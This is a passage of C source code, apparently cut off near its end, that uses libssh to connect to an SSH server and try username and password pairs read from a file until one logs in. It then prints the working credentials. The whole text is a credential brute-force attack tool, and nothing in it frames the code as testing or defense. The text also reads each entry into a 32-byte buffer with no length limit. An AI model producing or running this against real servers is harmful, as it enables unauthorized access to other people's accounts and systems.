#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libssh/libssh.h>
#include <libssh/sftp.h>

#define HOSTNAME "server.example.com"

int main(int argc, char** argv) {
    // Read the password and username list from a file
    FILE* pw_file = fopen("passwords.txt", "r");
    char username[32];
    char password[32];
    int success = 0;

    // Connect to the SSH server
    ssh_session ssh_session = ssh_new();
    ssh_options_set(ssh_session, SSH_OPTIONS_HOST, HOSTNAME);
    int ssh_error = ssh_connect(ssh_session);
    if (ssh_error != SSH_OK) {
        fprintf(stderr, "Error connecting to the SSH server: %s\n", ssh_get_error(ssh_session));
        ssh_free(ssh_session);
        return 1;
    }

    // Try each username and password in the list
    while (fscanf(pw_file, "%s %s", username, password) == 2) {
        // Set the username in the SSH session
        ssh_options_set(ssh_session, SSH_OPTIONS_USER, username);

        // Authenticate with the server
        ssh_error = ssh_userauth_password(ssh_session, NULL, password);
        if (ssh_error == SSH_AUTH_SUCCESS) {
            printf("Successfully authenticated with SSH server using username '%s' and password '%s'\n", username, password);
            success = 1;
            break;
        }
    }

    // If the login was not successful, print an error message and exit
    if (!success) {
        fprintf(stderr, "Error authenticating with the SSH server\n");
        ssh_disconnect(ssh_session);
        ssh_free(ssh_session);
        return 1;
    }

 
